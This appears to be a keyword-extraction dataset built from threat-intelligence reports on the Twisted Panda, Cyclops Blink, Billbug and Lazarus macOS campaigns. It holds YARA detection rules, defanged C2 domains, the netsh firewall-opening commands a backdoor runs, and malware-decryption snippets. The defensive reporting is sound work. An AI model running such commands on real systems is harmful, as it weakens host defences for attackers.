shellcodes and PEs, especially combined with dynamic API resolutions via hashes, are also a signature technique for many Chinese groups. The victimology of the Twisted Panda campaign is consistent with Chinese long-term interests.TargetsThe defense research institutes that we identified as targets of this attack belong to a holding company within the Russian state-owned defense conglomerate Rostec Corporation. It is Russia’s largest holding company in the radio- electronics industry and the specific targeted research institutes’ primary focus is the development and manufacturing of electronic warfare systems, military-specialized onboard radio-electronic equipment, air-based radar stations and means of state identification. The research entities are also involved in avionics systems for civil aviation, the development of a variety of civil products such as medical equipment and control systems for energy, transportation, and engineering industries.15/20The Made in China 2025 plan defines objectives for China to become a major technological and economic power, and also identifies the sectors in which it must become a world leader, including robotics, medical equipment, and aviation. To support that, China’s five-year plan for the years 2021-2025 outlines a steady increase in R&D budgets each year in order to expand China’s scientific and technical capabilities. However, multiple reports – not from the United States and other countries including Russia, which is considered China’s strategic partner – reveal that alongside overt relations and measures, China employs covert tools to gather information, thus combining partnerships with diverse espionage activity. Together with the previous reports of Chinese APT groups conducting their espionage operations against the Russian defense and governmental sector, the Twisted Panda campaign described in this research might serve as more evidence of the use of espionage in a systematic and long-term effort to achieve Chinese strategic objectives in technological superiority and military power. SummaryIn this report, CPR researchers have described and exposed a Chinese espionage operation named Twisted Panda which targets defense research institutes in Russia and possibly also in Belarus. This campaign relies on social engineering techniques and exploits recently imposed sanctions on Russia to deliver a previously undocumented backdoor called SPINNER to specific targets. The purpose of the backdoor and the operation is likely to collect information from targets inside the high-tech Russian defense industry to support China in its technological advancement.As a part of this investigation, we uncovered the previous wave of this campaign, also likely targeting Russian or Russia-related entities, active since at least June 2021. The evolution of the tools and techniques throughout this time period indicates that the actors behind the campaign are persistent in achieving their goals in a stealthy manner. In addition, the Twisted Panda campaign shows once again how quickly Chinese espionage actors adapt and adjust to world events, using the most relevant and up-to-date lures to maximize their chances of success.To help track and research the Twisted Panda campaign, see Appendix A for relevant Yara rules for all the major components of this attack. loader (64-bit) www.miniboxmail[.]com www.minzdravros[.]com img.elliotterusties[.]com Appendix A – YARA rulesdropper loader16/20rule apt_CN_TwistedPanda_loader { meta: author = ""Check Point Research"" description = ""Detect loader used by TwistedPanda"" date = ""2022-04-14"" // 6A 40 push 40h ; '@' // 68 00 30 00 00 push 3000h $seq1 = { 6A 40 68 00 30 00 00 } // 6A 00 push 0 ; lpOverlapped // 50 push eax ; lpNumberOfBytesRead // 6A 14 push 14h ; nNumberOfBytesToRead // 8D ?? ?? ?? ?? ?? lea eax, [ebp+Buffer] // 50 push eax ; lpBuffer // 53 push ebx ; hFile // FF 15 04 D0 4C 70 call ds:ReadFile $seq2 = { 6A 00 50 6A 14 8D ?? ?? ?? ?? ?? 50 53 FF }// 6A 00 push 0 // 6A 00 push 0 // 6A 03 push 3 // 6A 00 push 0 // 6A 03 push 3 // 68 00 00 00 80 push 80000000h $seq3 = { 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 80 } $decryption = { 8B C? [2-3] F6 D? 1A C? [2-3] [2-3] 30 0? ?? 4? } // MZ signature at offset 0 and uint16(0) == 0x5A4D and // PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 and filesize < 3000KB and all of ($seq*) and $decryption author = ""Check Point Research"" description = ""Detect the obfuscated variant of SPINNER payload used by TwistedPanda"" date = ""2022-04-14"" // C7 ?? ?? ?? 00 00 00 mov dword ptr [eax+??], ??17/20// C7 ?? ?? ?? 00 00 00 mov dword ptr [eax+??], ?? // C6 mov byte ptr [eax], 0 $config_init = { C7 ?? ?? ?? 00 00 00 C7 ?? ?? ?? 00 00 00 C6 }$c2_cmd_1 = { 01 00 03 10} $c2_cmd_2 = { 02 00 01 10} $c2_cmd_3 = { 01 00 01 10}// 8D 83 ?? ?? ?? ?? lea eax, xor_key[ebx] // 80 B3 ?? ?? ?? ?? ?? xor xor_key[ebx], 50h // 89 F1 mov ecx, esi ; this // 6A 01 push 1 ; Size // 50 push eax ; Src // E8 ?? ?? ?? ?? call str_append // 80 B3 ?? ?? ?? ?? ?? xor xor_key[ebx], 50h $decryption = { 8D 83 [4] 80 B3 [5] 89 F1 6A 01 50 E8 [4] 80 B3 } // MZ signature at offset 0 and uint16(0) == 0x5A4D and // PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 and filesize < 3000KB and #config_init > 10 and 2 of ($c2_cmd_*) and $decryption author = ""Check Point Research"" description = ""Detect an older variant of SPINNER payload used by TwistedPanda"" date = ""2022-04-14"" // C7 ?? ?? ?? 00 00 00 mov dword ptr [eax+??], ?? // C7 ?? ?? ?? 00 00 00 mov dword ptr [eax+??], ?? // C6 mov byte ptr [eax], 0 $config_init = { C7 [3] 00 00 00 C7 [3] 00 00 00 C6 }$c2_cmd_1 = { 01 00 03 10 } $c2_cmd_2 = { 02 00 01 10 } $c2_cmd_3 = { 01 00 01 10 } $c2_cmd_4 = { 01 00 00 10 } $c2_cmd_5 = { 02 00 00 10 }// 80 B3 ?? ?? ?? ?? ?? xor ds:dd_encrypted_url[ebx], 50h // 8D BB ?? ?? ?? ?? lea edi, dd_encrypted_url[ebx] // 8B 56 14 mov edx, [esi+14h] // 8B C2 mov eax, edx // 8B 4E 10 mov ecx, [esi+10h] // 2B C1 sub eax, ecx18/20// 83 F8 01 cmp eax, 1 $decryption = { 80 B3 [5] 8D BB [4] 8B 56 14 8B C2 8B 4E 10 2B C1 83 F8 01 } // MZ signature at offset 0 and uint16(0) == 0x5A4D and // PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 and filesize < 3000KB and #config_init > 10 and 2 of ($c2_cmd_*) and $decryption author = ""Check Point Research"" description = ""Detect the 64bit Loader DLL used by TwistedPanda"" date = ""2022-04-14"" // 48 8D ?? ?? ?? ?? ?? ?? ?? lea rdx, ds:2[rdx*2] // 48 8B C1 mov rax, rcx // 48 81 ?? ?? ?? ?? ?? cmp rdx, 1000h // 72 ?? jb short loc_7FFDF0BA1B48 $path_check = { 48 8D [6] 48 8B ?? 48 81 [5] 72 }// 48 8B D0 mov rdx, rax ; lpBuffer // 41 B8 F0 16 00 00 mov r8d, 16F0h ; nNumberOfBytesToRead // 48 8B CF mov rcx, rdi ; hFile // 48 8B D8 mov rbx, rax // FF ?? ?? ?? ?? call cs:ReadFile $shellcode_read = { 48 8B D0 41 B8 F0 16 00 00 48 8B CF 48 8B D8 FF}// BA F0 16 00 00 mov edx, 16F0h ; dwSize // 44 8D 4E 40 lea r9d, [rsi+40h] ; flProtect // 33 C9 xor ecx, ecx ; lpAddress // 41 B8 00 30 00 00 mov r8d, 3000h ; flAllocationType // FF ?? ?? ?? ?? ?? call cs:VirtualAlloc $shellcode_allocate = { BA F0 16 00 00 44 8D 4E 40 33 C9 41 B8 00 30 00 00 FF }condition: // MZ signature at offset 0 and uint16(0) == 0x5A4D and // PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 and filesize < 3000KB and $path_check and $shellcode_allocate and $shellcode_read author = ""Check Point Research"" description = ""Detect droppers used by TwistedPanda"" date = ""2022-04-14"" // 81 FA ?? ?? ?? ?? cmp edx, 4BED1896h // 75 ?? jnz short loc_140001829 // E8 ?? ?? ?? ?? call sub_1400019D0 // 48 89 05 ?? ?? ?? ?? mov cs:qword_14001ED38, rax // E? ?? ?? ?? ?? jmp loc_1400018DD $switch_control = { 81 FA [4] 75 ?? E8 [4] 48 89 05 [4] E? }// 41 0F ?? ?? movsx edx, byte ptr [r9] // 44 ?? ?? or r8d, edx // 41 ?? ?? 03 rol r8d, 3 // 41 81 ?? ?? ?? ?? ?? xor r8d, 0EF112233h // 41 ?? ?? mov eax, r10d $byte_manipulation = { 41 0F [2] 44 [2] 41 [2] 03 41 81 [5] 41 }// %public% $stack_strings_1 = { 25 00 70 00 } $stack_strings_2 = { 75 00 62 00 } $stack_strings_3 = { 6C 00 69 00 } $stack_strings_4 = { 63 00 25 00 }condition: // MZ signature at offset 0 and uint16(0) == 0x5A4D and // PE signature at offset stored in MZ header at 0x3C uint32(uint32(0x3C)) == 0x00004550 and filesize < 3000KB and #switch_control > 8 and all of ($stack_strings_*) and ","{'phrases': ['FF', 'the document', 'addition', 'executes', 'persistence', 'the loader', 'DLL', 'Windows', 'cmdl32.exe', 'decrypts', 'the INIT file', 'the shellcode', 'SPINNER', 'BA', 'msiexec.exe', 'system info', 'Command', 'control', 'payloads', '10', 'the final payload'], 'target': 'FF; the document; addition; executes; persistence; the loader; DLL; Windows; cmdl32.exe; decrypts; the INIT file; the shellcode; SPINNER; BA; msiexec.exe; system info; Command; control; payloads; 10; the final payload.'}"
Sandworm; VPNFilter malware; access; devices; hosts; EC; the malware; persistence; Beacon; beacon; device information; the attacker; control; the device; command; data; the C2 server; HTTPS; requests; the C2 server; requests; Mimikatz; C2 port; 10; use; infrastructure; 11; stage; modules; traffic manipulation; destruction; Lateral movement; devices; Steal; Credentials; Admin; tools; the victim; IP address; access; 13; domains; infrastructure; May 2018; the UK; October 2018; a second stage; the VPNFilter malware; February 2018; devices; January 2018; malicious traffic; June 2019; foothold; January 2018; the group; the time.,['1. The Sandworm group deploys modified firmware images containing the Cyclops Blink malware by exploiting externally available services on devices. 2. The malware establishes persistence by being included in the device firmware that loads on start up. It also modifies Linux scripts that execute on boot. 3. Cyclops Blink evades defenses by disabling the firewall and masquerading as a legitimate Linux process. 4. The malware collects system information from the device for exfiltration. 5. It communicates with command and control servers using encrypted non-standard protocols over HTTP/HTTPS. Traffic goes through proxies and uses fallback channels. 6. Cyclops Blink can download additional modules and files from the C2 server. 7. It exfiltrates data back to the C2 server. '],"Extract the keywords: 2/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKNEWSNew Sandworm malware Cyclops Blink replaces VPNFilter The Sandworm actor has replaced the exposed VPNFilter malware with a new more advanced framework.Background The UK National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA) and the Federal Bureau of Investigation (FBI) in the US have identified that the actor known as Sandworm or Voodoo Bear is using a new malware, referred to here as Cyclops Blink. The NCSC, CISA, FBI and NSA have previously attributed the Sandworm actor to the Russian GRU’s Main Centre for Special Technologies GTsST.The malicious cyber activity below has previously been attributed to Sandworm:The BlackEnergy disruption of Ukrainian electricity in 2015 Industroyer in 2016 NotPetya in 2017 Attacks against the Winter Olympics and Paralympics in 2018 A series of disruptive attacks against Georgia in 2019Cyclops Blink appears to be a replacement framework for the VPNFilter malware exposed in 2018, which exploited network devices, primarily small office/home office (SOHO) routers, and network attached storage (NAS) devices.This advisory summarises the VPNFilter malware it replaces, and provides more detail on Cyclops Blink, as well as the associated tactics, techniques andurlﬁlter1/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKprocedures (TTPs) used by Sandworm. An NCSC malware analysis report on Cyclops Blink is also available and can be read in parallel.It also points to mitigation measures to help organisations that may be affected by this malware.VPNFilterFirst exposed in 2018 A series of articles published by Cisco Talos in 2018 describes VPNFilter and its modules in detail. VPNFilter was deployed in stages, with most functionality in the third-stage modules. These modules enabled traffic manipulation, destruction of the infected host device, and likely enabled downstream devices to be exploited. They also allowed monitoring of Modbus SCADA protocols, which appears to be an ongoing requirement for Sandworm, as also seen in their previous attacks against ICS networks.VPNFilter targeting was widespread and appeared indiscriminate, with some exceptions: Cisco Talos reported an increase of victims in Ukraine in May 2018. Sandworm also deployed VPNFilter against targets in the Republic of Korea before the 2018 Winter Olympics.In May 2018 Cisco Talos published the blog that exposed VPNFilter, and the US Department of Justice linked the activity to Sandworm, and announced its disruption of the botnet.Activity since its exposure A Trendmicro blog in January 2021 detailed residual VPNFilter infections and provided data showing a reduction in requests to a known C2 domain. Since the disruption in May 2018, Sandworm has shown limited interest in existing VPNFilter footholds, instead preferring to retool.urlﬁlter2/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKCyclops BlinkActive since 2019 The NCSC, CISA, FBI and NSA, along with industry partners, have now identified a large-scale modular malware framework which is affecting network devices. The new malware is referred to here as Cyclops Blink and has been deployed since at least June 2019, fourteen months after VPNFilter was disrupted. In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread.The actor has so far primarily deployed Cyclops Blink to WatchGuard devices, but it is likely that Sandworm would be capable of compiling the malware for other architectures and firmware.Note: Note that only WatchGuard devices that were reconfigured from the manufacturer default settings to open remote management interfaces to external access could be infectedMalware overviewThe malware itself is sophisticated and modular with basic core functionality to beacon (T1132.002) device information back to a server and enable files to be downloaded and executed. There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required.The NCSC has published a malware analysis report on Cyclops Blink which provides more detail about the malware.urlﬁlter3/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKPost exploitationPost exploitation, Cyclops Blink is generally deployed as part of a firmware ‘update’ (T1542.001). This achieves persistence when the device is rebooted and makes remediation harder.Victim devices are organised into clusters and each deployment of Cyclops Blink has a list of command and control (C2) IP addresses and ports that it uses (T1008). All the known C2 IP addresses to date have been used by compromised WatchGuard firewall devices. Communications between Cyclops Blink clients and servers are protected under Transport Layer Security (TLS) (T1071.001), using individually generated keys and certificates. Sandworm manages Cyclops Blink by connecting to the C2 layer through the Tor network:Mitigation Cyclops Blink persists on reboot and throughout the legitimate firmware update process. Affected organisations should therefore take steps to remove theurlﬁlter4/102/23/2022malware.New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKWatchGuard has worked closely with the FBI, CISA and the NCSC, and has provided tooling and guidance to enable detection and removal of Cyclops Blink on WatchGuard devices through a non-standard upgrade process. Device owners should follow each step in these instructions to ensure that devices are patched to the latest version and that any infection is removed.The WatchGuard tooling and guidance is available at: url addition:If your device is identified as infected with Cyclops Blink, you should assume that any passwords present on the device have been compromised and replace them (see NCSC password guidance for organisations). You should ensure that the management interface of network devices is not exposed to the internet.In addition:If your device is identified as infected with Cyclops Blink, you should assume that any passwords present on the device have been compromised and replace them (see the NCSC's password guidance for organisations) You should ensure that the management interface of network devices is not exposed to the internetIndicators of compromise Please refer to the accompanying Cyclops Blink malware analysis report for indicators of compromise which may help to detect this activity.urlﬁlter5/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKMITRE ATT&CK® This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.TacticInitial AccessTechniqueT1133ProcedureExternal Remote ServicesThe actors most likely deploy modified device firmware images by exploiting an externally available serviceExecutionT1059.004Command and Scripting Interpreter: Unix ShellCyclops Blink executes downloaded files using the Linux APIPersistenceT1542.001Pre-OS Boot: System FirmwareCyclops Blink is deployed within a modified device firmware imageT1037.004Boot or Logon Initialisation Scripts: RC ScriptsDefence EvasionT1562.004Cyclops Blink is executed on device startup, using a modified RC scriptImpair Defenses: Disable or Modify System FirewallCyclops Blink modifies the Linux system firewall to enable C2 communicationT1036.005Masquerading: Match Legitimate Name or Locationurlﬁlter6/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKCyclops Blink masquerades as a Linux kernel thread processDiscoveryT1082System Information DiscoveryCyclops Blink regularly queries device informationCommand and ControlT1090ProxyT1132.002Data Encoding: Non-Standard EncodingCyclops Blink command messages use a custom binary scheme to encode dataT1008Fallback ChannelsCyclops Blink randomly selects a C2 server from contained lists of IPv4 addresses and port numbersT1071.001Application Layer Protocol: Web ProtocolsCyclops Blink can download files via HTTP or HTTPST1573.002Encrypted Channel: Asymmetric CryptographyCyclops Blink C2 messages are individually encrypted using AES-256-CBC and sent underneath TLST1571Non-Standard PortThe list of port numbers used by Cyclops Blink includes non-standard ports not typically associated with HTTP or HTTPS trafficurlﬁlter7/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKExfiltrationT1041Exfiltration Over C2 ChannelCyclops Blink can upload files to a C2 serverConclusion A Cyclops Blink infection does not mean that an organisation is the primary target, but it may be selected to be, or its machines could be used to conduct attacks.Organisations are advised to follow the mitigation advice in this advisory and to refer to indicators of compromise (not exhaustive) in the Cyclops Blink malware analysis report to detect possible activity on networks.UK organisations affected by the activity outlined in this advisory should report any compromises to the NCSC via our website.Further guidance A variety of mitigations will be of use in defending against the malware featured in this advisory:Do not expose management interfaces of network devices to the internet the management interface is a significant attack surface, so not exposing them reduces the risk. See NCSC guidance: Acquiring, managing and disposing of network devices Protect your devices and networks by keeping them up to date use the latest supported versions, apply security patches promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: Mitigating malware Use multi-factor authentication to reduce the impact of password compromisesurlﬁlter8/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKsee NCSC guidance: Multi-factor authentication for online services and Setting up 2-Step Verification (2SV) Treat people as your first line of defence tell staff how to report suspected phishing emails, and ensure they feel confident to do so. Investigate their reports promptly and thoroughly. Never punish users for clicking phishing links or opening attachments. See NCSC guidance: Phishing attacks: defending your organisation Set up a security monitoring capability so you are collecting the data needed to analyse network intrusions. See NCSC guidance: Introduction to logging for security purposes Prevent and detect lateral movement in your organisation’s networks see NCSC guidance: Preventing Lateral MovementPUBLISHED 23 February 2022NEWS T YPE AlertWRIT T EN FOR Cyber security professionals Large organisations Public sectorWas this articlehelpful?YesNourlﬁlter9/102/23/2022New Sandworm malware Cyclops Blink replaces VPNFilter - NCSC.GOV.UKurlﬁlter10/10 ","{'phrases': ['Sandworm', 'firmware', 'the Cyclops Blink', 'devices', 'the malware', 'persistence', 'the device', 'Linux', 'boot', 'defenses', 'system information', 'exfiltration', 'command', 'control', 'servers', 'HTTPS', 'Traffic', 'use', 'fallback channels', 'addition', 'files', 'C2', 'data'], 'target': 'Sandworm; firmware; the Cyclops Blink; devices; the malware; persistence; the device; Linux; boot; defenses; system information; exfiltration; command; control; servers; HTTPS; Traffic; use; fallback channels; addition; files; C2; data.'}"
the attackers; first; the victim; use; DLL; Monotog; Backdoor; Hanotog; compromise; registry; control; addition; custom malware; persistence; registry; ping; IP address; port; the compromised system; service; persistence; keylogging; screenshots; HTTPS traffic; commands; the system; memory; data.,"['1. The attackers gained initial access by exploiting vulnerabilities in public-facing applications of the target organizations. 2. They used dual-use tools like AdFind, WinRAR, and Certutil to help map the internal network and carry out activities. 3. Custom malware like the Hannotog and Sagerunex backdoors were deployed on compromised systems. 4. The backdoors provided capabilities like command execution, firewall manipulation, data exfiltration, and C2 communication. 5. The Sagerunex backdoor stores encrypted configuration files on disk and communicates with C2 servers over HTTPS. 6. Various techniques are used to proxy C2 traffic, including WPAD and web browsers. Commands allow theft of data, execution of code, and malware distribution. 7. While no data theft was observed, the targeting of government agencies points to espionage being the end goal. 8. The certificate authority was likely compromised with the intent of stealing certificates to sign malware and avoid detection. ']","Extract the keywords: symantec-enterprise-blogs.security.com /blogs/threat-intelligence/espionage-asia-governments-cert-authority Billbug: State-sponsored Actor Targets Cert Authority, Government Agencies in Multiple Asian CountriesState-sponsored actors compromised a digital certificate authority in an Asian country during a campaign in which multiple government agencies were also targeted.Symantec, by Broadcom Software, was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group. Billbug (aka Lotus Blossom, Thrip) is a long-established advanced persistent threat (APT) group that is believed to have been active since at least 2009. Symantec has previously published on this group’s activity in 2018 and 2019 under the Thrip name, but following our 2019 investigation, we determined that Thrip and Billbug were most likely the same group so now track all activity under the Billbug name.In activity documented by Symantec in 2019, we detailed how the group was using a backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Both these tools were also seen in this more recent activity.The victims in this campaign included a certificate authority, as well as government and defense agencies. All the victims were based in various countries in Asia. Billbug is known to focus on targets in Asian countries. In at least one of the government victims, a large number of machines on the network were compromised by the attackers.The targeting of a certificate authority is notable, as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate, and help it avoid detection on victim machines. It could also potentially use compromised certificates to intercept HTTPS traffic. However, although this is a possible motivation for targeting a certificate authority, Symantec has seen no evidence to suggest they were successful in compromising digital certificates. Symantec has notified the cert authority in question to inform them of this activity.This activity has been ongoing since at least March 2022. Attack chainThere are some indications that the attackers are exploiting public-facing applications to gain initial access to victim networks.The attackers use multiple dual-use tools in this attack campaign, as well as custom malware. Billbug’s extensive use of dual-use and living-off-the-land tools was also notable in its previous campaigns. Among the dual-use tools1/5leveraged in this recent activity are:AdFind – A publicly available tool that is used to query Active Directory. It has legitimate uses but is widely used by attackers to help map a network. Winmail – Can open winmail.dat files. WinRAR – An archive manager that can be used to archive or zip files - for example, prior to exfiltration. Ping – A tool that is freely available online that can allow users to determine if a specific location on a network is responding. Tracert – A network tool that can be used to determine the “path” packets take from one IP address to another. It provides the hostname, IP address, and the response time to a ping. Route – A path for sending packets through the internet network to an address on another network. NBTscan – Open-source command-line NetBIOS scanner. Certutil – Microsoft Windows utility that can be used for various malicious purposes, such as to decode information, to download files, and to install browser root certificates. Port Scanner – Allows an attacker to determine what ports are open on a network and could potentially be used to send and receive data.Multiple files that are believed to be loaders for the Hannotog backdoor were spotted on victim machines. A backdoor was then deployed on the compromised system. This backdoor has multiple functionalities:It executes netsh to update the firewall settings:netsh advfirewall firewall add rule name=""Core Networking - Router Solicitation (ICMP-In)"" dir=in action=allow program=""%s"" enable=yes netsh firewall add portopening UDP 5900 @xpsp2res.dll,-22006 ENABLE ALL',0 netsh firewall add allowedprogram name=""SNMP Trap Service"" program=""%s"" mode=enableListens on port 5900 Can create a service for persistence Can also stop services Can upload encrypted data Can execute cmd.exe /c %s command to gather system information Can download files to the machineA tool called Stowaway Proxy Tool was also downloaded to victim machines. Stowaway is a multi-level proxy tool written in the Go language and intended for use by penetration testers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through intranet access restrictions, construct a tree-like node network, and easily implement management functions. It is not unusual to see penetration testing tools misused by threat actors. Cobalt Strike, which is a penetration testing framework, is considered commodity malware by many due to how often it is used by malicious actors. Sagerunex - Technical detailsThe Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command-and- control (C&C) server. The analyzed sample had no hardcoded configuration, so it had to be dropped on the machine by a loader malware, such as Hannotog.In the sample analyzed by Symantec, configuration is passed to the sample via a parameter of the exported function (called MainEntry). That configuration is decrypted with a simple XOR operation:def simplecrypt(x):return xor(x, b""\xad"" + x[:-1])Next, the sample finds the explorer.exe process and uses it to change the token of the current thread. It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists. These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256:def decrypt(datasample):key = b'\x53\x12\x76\x23\x94\x89\x78\x45\x58\x31\x62\x83\x77\x95\x59\x17\x31\x47\x73\x50\x22\x34\x65\x89\x49\x12\x67\x41\x90\x352/5realkey = datasample[:0x10]+ b'\x00' * 0x10for i in range(0x2000): realkey = hashlib.sha256(realkey + key).digest()raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:])print(""checksum"", raw[-32:].hex()) return raw[:-32]The encryption key is hardcoded, and was previously used in an older sample of this malware. The same encryption algorithm is used for network communication. The encrypted data structure is as follows:struct encrypted_data { byte[16] IV; byte[N] message_data; // always divisible by 16, padding added as necessary byte[32] sha256_checksum; }The sample stores configuration and state in the following file:%appdata%/microsoft/protect/windows/DMI%X.DAT (where %X is variable and depends on the parameter with which sample was started).It is also encrypted, but with RC4. This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead. The config file modification date will always be in the year 2011 – the “file last edit” year is changed by the malware to 2011.Network communicationIn normal mode, the sample will try all the following supported connection modes in this order. In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32).- 1: httpsviaconfigproxy: HTTPS with configured proxy- 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery)- 3: httpsviaiexproxy: self-explanatory. Use proxy from \\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer- 4: httpsviafirefoxproxy - get proxy from \\Mozilla\\Firefox\\profiles.ini (one of FF config files)- 5: httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser- 6: httpspreconfig - try to connect without proxyThe network packet is composed of two parts: the header and the payload. Both are encrypted separately.struct network_packet { byte[64] encrypted_header; // see encrypted_data above byte[N] encrypted_payload; // see encrypted_data above }The structure of the decrypted header is as follows:struct header { }The structure of the decrypted payload mostly depends on the command ID. The list of supported commands includes:3/57: Return the list of currently configured proxies. 9: Execute a program, DLL or shell command. There are three supported subcommands: ""runexe"" to run an executable, ""rundll"" to run a DLL file, and anything else for arbitrary shell command. 11: Steal a local file (gets a file name specified in the command payload). 15: Get a configured file path (configured by command 18). 17: Drop a file to a specified path – but only if the specified path was previously selected by command 18. 18: Select a file path for commands 15 and 17.MotivationWhile we do not see data being exfiltrated in this campaign, Billbug is widely regarded as being an espionage actor, indicating that data theft is the most likely motivation in this campaign. The victims in this campaign – government agencies and a certificate authority – also point to an espionage and data-theft motive. The targeting of the government victims is most likely driven by espionage motivations, with the certificate authority likely targeted in order to steal legitimate digital certificates, as mentioned in the introduction.This is potentially very dangerous, as if Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines. The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well-resourced operator that is capable of carrying out sustained and wide-ranging campaigns. Billbug also appears to be undeterred by the possibility of having this activity attributed to it, with it reusing tools that have been linked to the group in the past. ProtectionFor the latest protection updates, please visit the Symantec Protection Bulletin. ","{'phrases': ['the attackers', 'initial access', 'public-facing applications', 'dual-use tools', 'AdFind', 'Certutil', 'custom malware', 'Hannotog', 'Sagerunex', 'Backdoor', 'IP', 'exfiltration', 'communication', 'configuration', 'files', 'server', 'HTTPS', 'proxy', 'FF', 'WPAD', 'commands', 'code', 'data theft', 'the targeting', 'Government Agencies', 'the certificate authority', 'certificates', 'detection'], 'target': 'the attackers; initial access; public-facing applications; dual-use tools; AdFind; Certutil; custom malware; Hannotog; Sagerunex; Backdoor; IP; exfiltration; communication; configuration; files; server; HTTPS; proxy; FF; WPAD; commands; code; data theft; the targeting; Government Agencies; the certificate authority; certificates; detection.'}"
the threat actors; social engineering; victims; download; trojanized cryptocurrency apps; Windows; macOS; Esilet.dmg; the malware; persistence; keys; the victim; credentials; the victim; funds; the cryptocurrency community; interest; the attackers; credentials; access; obfuscation; encryption; data; Shell; additional malware; Persistence; the system; Virtual Machine; Stage; obfuscation; phishing; fraudulent cryptocurrency transactions.,"[""1. A trojanized cryptocurrency app Esilet is distributed. 2. Esilet's JavaScript code downloads the NukeSped malware. 3. NukeSped persists as a launch agent on the system. 4. It connects to command and control servers to receive tasks. 5. NukeSped can survey the system, run commands, read/write files based on commands. ""]","Extract the keywords: objective-see.org /blog/blog_0x6E.htmlFrom The DPRK With Love - analyzing a recent north korean macOS backdoorby: Patrick Wardle / May 9, 2022BackgroundIn mid April, the Cybersecurity & Infrastructure Security Agency (CISA) published a report detailing ""[A] North Korean State-Sponsored APT Target[ing] Blockchain Companies"":The report begins with an informative overview of both the targets of, and techniques used the North Korean cyber actor (publicly known as Lazarus Group or APT38).The U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim’s computer, propagate malware across the victim’s network environment, and steal private keys or exploit other security gaps.These activities enable additional follow-on activities that initiate fraudulent blockchain transactions. -CISAMoreover, the report also (albeit rather briefly) describes the malicious applications targeting both Windows and Mac.The macOS samples listed in the CISA report, include:DAFOM-1.0.0.dmg TokenAIS.app.zip Specifically we’ll focus on a sample distributed within a trojanized application named Esilet.Esilet: 1st-Stage The propensity of the North Koreans to target the cryptocurrency community via trojanized application is not new. Previous research on this includes:The CISA report notes that ""Esilet claims to offer live cryptocurrency prices and price predictions"".Objective-See: OSX.WatchCat SentinelOne: Four Distinct Families of Lazarus Malware Target Apple’s macOS Platform …which can be confirmed by running the (trojanized) application in a isolated Virtual Machine:The application is distributed via a disk image, named Esilet.dmg: % du -h ~/Malware/NukeSped/Esilet.dmg 78M /Users/patrick/Malware/NukeSped/Esilet.dmg% shasum -a256 ~/Malware/NukeSped/Esilet.dmg detections have (somewhat) increased since then:Esilet.dmg on VirusTotalYou can mount the disk image (via hdiutil), to extract its files: hdiutil attach /Users/patrick/Malware/TraderTraitor/Esilet.dmg -noverify/dev/disk6 GUID_partition_scheme /dev/disk6s1 Apple_HFS /Volumes/Esilet% ls /Volumes/Esilet Esilet.appOpening the mounted disk image (/Volumes/Esilet) in Finder reveals a application, named Esilet.app:3/18The application is not signed, and via the file utility we see its main executable is a standard 64-bit Mach-O binary (named Esilet): % codesign -dvv /Volumes/Esilet/Esilet.app /Volumes/Esilet/Esilet.app: code object is not signed at all% file /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet: Mach-O 64-bit executable x86_644/18We can confirm CISA’s findings that application is an Electon application, by looking at Esilet.app’s dependencies via otool (noting Electron Framework.framework): % otool -L /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet:/System/Library/Frameworks/MediaPlayer.framework/Versions/A/MediaPlayer @rpath/Electron Framework.framework/Electron Framework From a reversing point of view, this is good news. Why? Electron applications are rather trivial to analyze, Electon is, “a framework for creating native applications with web technologies like JavaScript, HTML, as they (always?) ship with their original (JavaScript) source code. However this code may be archived and CSS.” and thus, must first be unpacked. To learn more about Electon, head over to: If an Electron application is packed, the archive format is 